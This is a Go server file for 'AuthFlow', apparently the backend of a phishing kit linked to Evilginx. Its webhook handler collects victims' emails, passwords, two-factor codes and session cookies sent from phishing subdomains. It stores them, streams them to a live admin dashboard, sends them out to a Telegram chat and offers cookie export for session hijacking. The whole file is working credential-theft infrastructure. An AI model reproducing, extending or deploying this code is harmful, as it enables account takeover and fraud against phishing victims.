package server

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"

	"authflow/internal/monitor"
	"authflow/internal/storage"
	"authflow/internal/webhook"
)

type Config struct {
	Domain        string            `json:"domain"`
	VpsIp         string            `json:"vps_ip"`
	TelegramToken string            `json:"telegram_token"`
	TelegramChat  string            `json:"telegram_chat"`
	AdminPass     string            `json:"admin_pass"`
	DataDir       string            `json:"data_dir"`
	Endpoints     map[string]string `json:"endpoints"`
	AdminPath     string            `json:"admin_path"`
	RetentionDays int               `json:"retention_days"`
	WebhookSecret string            `json:"webhook_secret"`
	AdminWhitelist []string         `json:"admin_whitelist"`
	ProxyURL      string            `json:"proxy_url"`
}

type Server struct {
	config    Config
	storage   *storage.Storage
	startTime time.Time
	upgrader  websocket.Upgrader
	wsClients map[*websocket.Conn]bool
	wsMutex   sync.RWMutex
}

func New(cfg Config) (*Server, error) {
	store, err := storage.New(cfg.DataDir)
	if err != nil {
		return nil, err
	}

	return &Server{
		config:    cfg,
		storage:   store,
		startTime: time.Now(),
		upgrader:  websocket.Upgrader{
			ReadBufferSize:  1024,
			WriteBufferSize: 1024,
			CheckOrigin:     func(r *http.Request) bool { return true },
		},
		wsClients: make(map[*websocket.Conn]bool),
	}, nil
}

func (s *Server) Start(port int) error {
	gin.SetMode(gin.ReleaseMode)
	r := gin.New()
	r.Use(gin.Recovery())
	r.SetTrustedProxies([]string{"127.0.0.1", "::1"})

	// WebSocket for live updates
	r.GET("/ws", s.handleWebSocket)
	
	// Health check
	r.GET("/health", s.handleHealth)
	
	// Evilginx webhook endpoint
	r.POST("/api/webhook", s.handleWebhook)

	// Admin routes
	admin := r.Group("/" + s.config.AdminPath)
	admin.Use(s.adminAuth())
	{
		admin.GET("/", s.handleDashboard)
		admin.GET("/data", s.handleDashboardData)
		admin.GET("/submissions", s.handleSubmissions)
		admin.GET("/visitors", s.handleVisitors)
		admin.POST("/restart", s.handleRestart)
		admin.POST("/cleanup", s.handleCleanup)
		admin.GET("/export/:id", s.handleExport)
		admin.GET("/logs", s.handleLogs)
	}

	log.Printf("AuthFlow Server started on port %d", port)
	log.Printf("Dashboard: http://localhost:%d/%s", port, s.config.AdminPath)
	
	return r.Run(fmt.Sprintf("0.0.0.0:%d", port))
}

func (s *Server) handleWebSocket(c *gin.Context) {
	conn, err := s.upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Printf("WebSocket upgrade error: %v", err)
		return
	}
	
	s.wsMutex.Lock()
	s.wsClients[conn] = true
	s.wsMutex.Unlock()

	// Start a read loop to handle heartbeats and disconnections
	go s.wsReadLoop(conn)
}

func (s *Server) wsReadLoop(conn *websocket.Conn) {
	defer func() {
		s.wsMutex.Lock()
		delete(s.wsClients, conn)
		s.wsMutex.Unlock()
		conn.Close()
	}()

	// Set read deadline and pong handler to keep connection alive
	conn.SetReadLimit(512)
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("WebSocket read error: %v", err)
			}
			break
		}
	}
}
func (s *Server) broadcast(event map[string]interface{}) {
	data, _ := json.Marshal(event)

	s.wsMutex.Lock()
	defer s.wsMutex.Unlock()

	for client := range s.wsClients {
		if err := client.WriteMessage(websocket.TextMessage, data); err != nil {
			client.Close()
			delete(s.wsClients, client)
		}
	}
}

func (s *Server) handleHealth(c *gin.Context) {
	c.JSON(200, gin.H{
		"status":    "ok",
		"timestamp": time.Now().Format(time.RFC3339),
		"uptime":    time.Since(s.startTime).Seconds(),
	})
}

func (s *Server) handleWebhook(c *gin.Context) {
	// Add CORS headers for JS-based capture from phishing subdomains
	c.Header("Access-Control-Allow-Origin", "*")
	c.Header("Access-Control-Allow-Methods", "POST, OPTIONS")
	c.Header("Access-Control-Allow-Headers", "Content-Type, X-Webhook-Secret")

	if c.Request.Method == "OPTIONS" {
		c.AbortWithStatus(204)
		return
	}

	// Verify webhook secret
	secret := c.GetHeader("X-Webhook-Secret")
	if s.config.WebhookSecret != "" && secret != s.config.WebhookSecret {
		log.Printf("Invalid webhook secret from %s", c.ClientIP())
		c.JSON(403, gin.H{"error": "Invalid secret"})
		return
	}

	var body map[string]interface{}
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(400, gin.H{"error": err.Error()})
		return
	}

	event, _ := body["event"].(string)
	// Handle Evilginx native webhook 'type' field
	if event == "" {
		event, _ = body["type"].(string)
	}
	body["type"] = event // Normalize for broadcast

	source, _ := body["source"].(string)
	email, _ := body["email"].(string)
	ip := monitor.GetClientIP(c.Request.Header, c.ClientIP())
	
	// Override IP if provided in webhook
	if ra, ok := body["remote_addr"].(string); ok && ra != "" {
		ip = ra
	}

	log.Printf("Webhook event: %s | Source: %s | Email: %s | IP: %s", event, source, email, ip)

	switch event {
	case "email":
		// Step 1: Email captured
		id := uuid.New().String()
		ua, _ := body["user_agent"].(string)
		
		if err := s.storage.CreateOrUpdateSubmission(id, source, email, "", ip, ua); err != nil {
			log.Printf("Error saving email: %v", err)
		}
		
		s.broadcast(map[string]interface{}{
			"type":      "email",
			"source":    source,
			"email":     email,
			"ip":        monitor.MaskIP(ip),
			"timestamp": time.Now().Format("15:04:05"),
		})
		
		log.Printf("Email captured: %s for %s from %s", email, source, ip)
		c.JSON(200, gin.H{"success": true})
		
	case "credentials":
		// Step 2: Password captured (full credentials)
		password, _ := body["password"].(string)
		ua, _ := body["user_agent"].(string)
		
		if err := s.storage.CreateOrUpdateSubmission("", source, email, password, ip, ua); err != nil {
			log.Printf("Error saving credentials: %v", err)
		}
		
		s.broadcast(map[string]interface{}{
			"type":      "credentials",
			"source":    source,
			"email":     email,
			"password":  password,
			"ip":        monitor.MaskIP(ip),
			"timestamp": time.Now().Format("15:04:05"),
		})
		
		// Send to Telegram
		go func() {
			sender := webhook.NewSender(s.config.TelegramToken, s.config.TelegramChat, s.config.ProxyURL)
			if err := sender.SendCredentials(source, email, password, ip); err != nil {
				log.Printf("Telegram error: %v", err)
			}
		}()
		
		log.Printf("Credentials captured: %s:%s from %s", email, password, ip)
		c.JSON(200, gin.H{"success": true})
		
	case "2fa":
		// Step 3: 2FA code submitted
		code, _ := body["code"].(string)
		
		if err := s.storage.Update2FA(email, source, code); err != nil {
			log.Printf("Error saving 2FA: %v", err)
		}
		
		s.broadcast(map[string]interface{}{
			"type":      "2fa",
			"source":    source,
			"email":     email,
			"code":      code,
			"ip":        monitor.MaskIP(ip),
			"timestamp": time.Now().Format("15:04:05"),
		})
		
		// Send 2FA notification
		go func() {
			sender := webhook.NewSender(s.config.TelegramToken, s.config.TelegramChat, s.config.ProxyURL)
			if err := sender.Send2FARequired(source, email, ip); err != nil {
				log.Printf("Telegram error: %v", err)
			}
		}()
		
		log.Printf("2FA code captured: %s for %s from %s", code, email, ip)
		c.JSON(200, gin.H{"success": true})
		
	case "session":
		// Step 4: Full session captured after successful login
		cookies, _ := body["cookies"].(string)
		if cookies == "" {
			cookies, _ = body["cookie_str"].(string)
		}
		
		if err := s.storage.UpdateSession(email, source, cookies); err != nil {
			log.Printf("Error saving session: %v", err)
		}
		
		s.broadcast(map[string]interface{}{
			"type":      "session",
			"source":    source,
			"email":     email,
			"ip":        monitor.MaskIP(ip),
			"timestamp": time.Now().Format("15:04:05"),
		})
		
		// Send session cookies via file
		go func() {
			sender := webhook.NewSender(s.config.TelegramToken, s.config.TelegramChat, s.config.ProxyURL)
			if err := sender.SendSession(source, email, cookies); err != nil {
				log.Printf("Telegram session error: %v", err)
			}
		}()
		
		log.Printf("Session captured for %s from %s", email, ip)
		c.JSON(200, gin.H{"success": true})
		
	default:
		log.Printf("Unknown event: %s", event)
		c.JSON(200, gin.H{"success": true})
	}
}

func (s *Server) adminAuth() gin.HandlerFunc {
	return func(c *gin.Context) {
		// IP Whitelist check
		if len(s.config.AdminWhitelist) > 0 {
			clientIP := c.ClientIP()
			allowed := false
			for _, ip := range s.config.AdminWhitelist {
				if ip == clientIP {
					allowed = true
					break
				}
			}
			if !allowed {
				c.AbortWithStatusJSON(403, gin.H{"error": "IP not whitelisted"})
				return
			}
		}

		auth := c.GetHeader("Authorization")
		if !strings.HasPrefix(auth, "Basic ") {
			c.Header("WWW-Authenticate", `Basic realm="AuthFlow"`)
			c.JSON(401, gin.H{"error": "Authentication required"})
			c.Abort()
			return
		}
		
		payload, err := base64.StdEncoding.DecodeString(auth[6:])
		if err != nil {
			c.JSON(401, gin.H{"error": "Invalid authentication"})
			c.Abort()
			return
		}
		
		parts := strings.SplitN(string(payload), ":", 2)
		if len(parts) != 2 || parts[0] != "admin" || parts[1] != s.config.AdminPass {
			c.JSON(403, gin.H{"error": "Invalid credentials"})
			c.Abort()
			return
		}
		
		c.Next()
	}
}

func (s *Server) handleDashboard(c *gin.Context) {
	c.Header("Content-Type", "text/html; charset=utf-8")
	tmpl, _ := template.New("dashboard").Parse(dashboardHTML)
	tmpl.Execute(c.Writer, gin.H{
		"domain":    s.config.Domain,
		"adminPath": s.config.AdminPath,
	})
}

func (s *Server) handleDashboardData(c *gin.Context) {
	visitors, humans, bots, submissions, completed, _ := s.storage.GetStats()
	
	recent, _ := s.storage.GetRecentSubmissions(20)
	
	c.JSON(200, gin.H{
		"stats": gin.H{
			"visitors":    visitors,
			"humans":      humans,
			"bots":        bots,
			"submissions": submissions,
			"completed":   completed,
		},
		"recent":    recent,
		"server": gin.H{
			"uptime": time.Since(s.startTime).Seconds(),
		},
		"endpoints": s.config.Endpoints,
	})
}

func (s *Server) handleSubmissions(c *gin.Context) {
	submissions, _ := s.storage.GetRecentSubmissions(100)
	c.JSON(200, submissions)
}

func (s *Server) handleVisitors(c *gin.Context) {
	// This would need to be implemented
	c.JSON(200, []interface{}{})
}

func (s *Server) handleRestart(c *gin.Context) {
	go func() {
		time.Sleep(1 * time.Second)
		cmd := exec.Command("systemctl", "restart", "authflow")
		cmd.Run()
	}()
	c.JSON(200, gin.H{"success": true, "message": "Restarting..."})
}

func (s *Server) handleCleanup(c *gin.Context) {
	days := s.config.RetentionDays
	if days <= 0 {
		days = 30
	}
	s.storage.Cleanup(days)
	c.JSON(200, gin.H{"success": true})
}

func (s *Server) handleExport(c *gin.Context) {
	id := c.Param("id")
	var cookies string
	s.storage.DB.QueryRow("SELECT cookies FROM submissions WHERE id LIKE ?", id+"%").Scan(&cookies)
	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=data_%s.txt", id))
	c.String(200, cookies)
}

func (s *Server) handleLogs(c *gin.Context) {
	c.String(200, "Logs available via: journalctl -u authflow -f\n")
}

const dashboardHTML = `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>AuthFlow Dashboard</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Consolas',monospace;background:#0a0e27;color:#e0e0e0;overflow:hidden}.header{background:linear-gradient(135deg,#0f1535,#0a0e27);padding:12px 20px;border-bottom:1px solid #1e2a4a;display:flex;justify-content:space-between}.logo h1{font-size:18px;color:#00d4ff}.stats{display:flex;gap:15px}.stat-badge{background:#1a1f3e;padding:5px 15px;border-radius:20px;border-left:3px solid #00d4ff}.stat-badge .label{font-size:10px;color:#8a9dc0}.stat-badge .value{font-size:18px;font-weight:bold}.main{display:flex;height:calc(100vh - 55px)}.terminal{flex:2;background:#0a0e27;border-right:1px solid #1e2a4a;display:flex;flex-direction:column}.terminal-header{background:#0d1130;padding:10px 15px;border-bottom:1px solid #1e2a4a;font-size:12px;color:#00d4ff}.terminal-content{flex:1;overflow-y:auto;padding:10px;font-size:11px}.log-line{padding:4px 8px;border-bottom:1px solid #1a1f3e}.log-line.email{background:rgba(251,191,36,0.1);border-left:3px solid #fbbf24}.log-line.credentials{background:rgba(52,211,153,0.1);border-left:3px solid #34d399}.log-line.session{background:rgba(96,165,250,0.1);border-left:3px solid #60a5fa}.timestamp{color:#8a9dc0;margin-right:10px}.stats-panel{flex:1;background:#0d1130;display:flex;flex-direction:column;padding:15px}.stats-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:20px}.stat-card{background:#1a1f3e;padding:12px;border-radius:8px;text-align:center}.stat-card h4{font-size:11px;color:#8a9dc0}.stat-card .number{font-size:24px;font-weight:bold;color:#00d4ff}.data-section{flex:1;overflow-y:auto}.data-section h3{font-size:12px;margin-bottom:10px;color:#00d4ff}.data-table{width:100%;border-collapse:collapse;font-size:11px}.data-table th{text-align:left;padding:8px;background:#1a1f3e;color:#8a9dc0}.data-table td{padding:6px 8px;border-bottom:1px solid #1e2a4a}.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:9px}.badge-email{background:#fbbf24}.badge-creds{background:#34d399}.badge-session{background:#60a5fa}</style></head>
<body><div class="header"><div class="logo"><h1>AuthFlow Dashboard</h1></div><div class="stats"><div class="stat-badge"><div class="label">Submissions</div><div class="value" id="statSubmissions">0</div></div><div class="stat-badge"><div class="label">Completed</div><div class="value" id="statCompleted">0</div></div><div class="stat-badge"><div class="label">Visitors</div><div class="value" id="statVisitors">0</div></div></div></div><div class="main"><div class="terminal"><div class="terminal-header">Live Event Log</div><div class="terminal-content" id="logContainer"><div class="log-line"><span class="timestamp">[--:--:--]</span> Monitoring active...</div></div></div><div class="stats-panel"><div class="stats-grid"><div class="stat-card"><h4>Total Submissions</h4><div class="number" id="totalSubmissions">-</div></div><div class="stat-card"><h4>Completed Sessions</h4><div class="number" id="totalCompleted">-</div></div><div class="stat-card"><h4>Total Visitors</h4><div class="number" id="totalVisitors">-</div></div><div class="stat-card"><h4>Uptime</h4><div class="number" id="uptime">-</div></div></div><div class="data-section"><h3>Recent Activity</h3><table class="data-table" id="recentTable"><thead><tr><th>Time</th><th>Source</th><th>Email</th><th>Status</th></tr></thead><tbody><tr><td colspan="4">Loading...</td></tr></tbody></table></div></div></div><script>let ws;function addLog(msg,type){const c=document.getElementById('logContainer');const t=new Date().toLocaleTimeString();const d=document.createElement('div');d.className='log-line '+type;d.innerHTML='<span class="timestamp">['+t+']</span> '+msg;c.appendChild(d);d.scrollIntoView();if(c.children.length>200)c.removeChild(c.children[0]);}function connect(){const p=location.protocol==='https:'?'wss:':'ws:';ws=new WebSocket(p+'//'+location.host+'/ws');ws.onopen=()=>addLog('Connected to event stream','email');ws.onmessage=e=>{const d=JSON.parse(e.data);if(d.type==='email'){addLog('Email: '+d.email+' | Source: '+d.source,'email');loadData();}else if(d.type==='credentials'){addLog('Credentials: '+d.email+' : '+d.password,'credentials');loadData();}else if(d.type==='session'){addLog('Session captured for '+d.email,'session');loadData();}};ws.onerror=()=>{addLog('Connection error, reconnecting...','');setTimeout(connect,3000);};ws.onclose=()=>{addLog('Disconnected, reconnecting...','');setTimeout(connect,3000);};}async function loadData(){try{const r=await fetch(location.pathname+'/data');const d=await r.json();document.getElementById('totalSubmissions').textContent=d.stats.submissions;document.getElementById('totalCompleted').textContent=d.stats.completed;document.getElementById('totalVisitors').textContent=d.stats.visitors;document.getElementById('statSubmissions').textContent=d.stats.submissions;document.getElementById('statCompleted').textContent=d.stats.completed;document.getElementById('statVisitors').textContent=d.stats.visitors;const u=Math.floor(d.server.uptime),h=Math.floor(u/3600),m=Math.floor((u%3600)/60);document.getElementById('uptime').textContent=h+'h '+m+'m';const html=d.recent.map(s=>'<tr><td>'+s.created_at.substring(11,19)+'</td><td>'+s.source+'</td><td>'+escapeHtml(s.email)+'</td><td>'+(s.completed?'Session Captured':'Credentials')+'</td></tr>').join('');document.querySelector('#recentTable tbody').innerHTML=html||'<tr><td colspan="4">No data</td></tr>';}catch(e){}}function escapeHtml(s){if(!s)return '';return s.replace(/[&<>]/g,function(m){if(m==='&')return'&amp;';if(m==='<')return'&lt;';if(m==='>')return'&gt;';return m;});}connect();loadData();setInterval(loadData,5000);</script></body></html>`